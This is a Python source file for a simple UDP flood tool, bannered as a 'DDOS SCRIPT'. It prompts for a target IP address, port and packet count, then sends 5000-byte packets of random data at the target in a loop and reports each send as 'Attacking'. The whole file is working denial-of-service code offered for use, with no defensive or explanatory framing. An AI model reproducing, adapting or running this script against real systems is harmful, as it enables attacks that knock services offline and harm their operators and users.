import os,time,socket,random

os.system("cls")
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(5000)
sent = 0

class dosattack():
    def __init__(self,ipaddress,port,packets):
        self.ipaddress=ipaddress
        self.port=port
        self.packets=packets

    def __str__(self):
        return " \u001b[33m__Informations__ \n\n \u001b[31;1mIp Address: \u001b[32;1m{}\n \u001b[31;1mPort: \u001b[32;1m{}\n \u001b[31;1mPacket: \u001b[32;1m{}".format(self.ipaddress,self.port,self.packets)

    def __len__(self):
        return self.packets

while True:
	try:
		print("""
         \u001b[36m______________________________________________________

                \u001b[36mW E L C O M E  \u001b[31;1mD D O S  \u001b[36mS C R I P T

                    \u001b[37mCreated by \u001b[36mFerhat ERTURK
        ______________________________________________________
                    """)
		time.sleep(3)
		ipp=input(" \u001b[32;1mSystem Ip Address:\u001b[35;1m ")
		pport=int(input(" \u001b[32;1mWhich Port:\u001b[35;1m "))
		packetss=int(input(" \u001b[32;1mHow Many Packages:\u001b[35;1m "))
		os.system("cls")
		break
	except ValueError:
		print("\n \u001b[31mPlease enter a number!")
		time.sleep(2)
		os.system("cls")

print("""
         \u001b[36m______________________________________________________

                \u001b[36mW E L C O M E  \u001b[31;1mD D O S  \u001b[36mS C R I P T

                    \u001b[37mCreated by \u001b[36mFerhat ERTURK
        ______________________________________________________
                    """)

atak1=dosattack(ipp,pport,packetss)
print(atak1)
os.system("cls")

for i in range(packetss):
    print("""
             \u001b[36m______________________________________________________

                    \u001b[36mW E L C O M E  \u001b[31;1mD D O S  \u001b[36mS C R I P T

                        \u001b[37mCreated by \u001b[36mFerhat ERTURK
            ______________________________________________________
                        """)
    print(atak1)
    s.sendto(packet,(ipp,pport))
    sent = sent + 1
    print("\n \u001b[33mAttacking>>> \u001b[31m{}".format(sent))
    os.system("cls")

print("""
         \u001b[36m______________________________________________________

                \u001b[36mW E L C O M E  \u001b[31;1mD D O S  \u001b[36mS C R I P T

                    \u001b[37mCreated by \u001b[36mFerhat ERTURK
        ______________________________________________________
                    """)
print(atak1)
print("\n \u001b[32mAttack Completed...")
input()
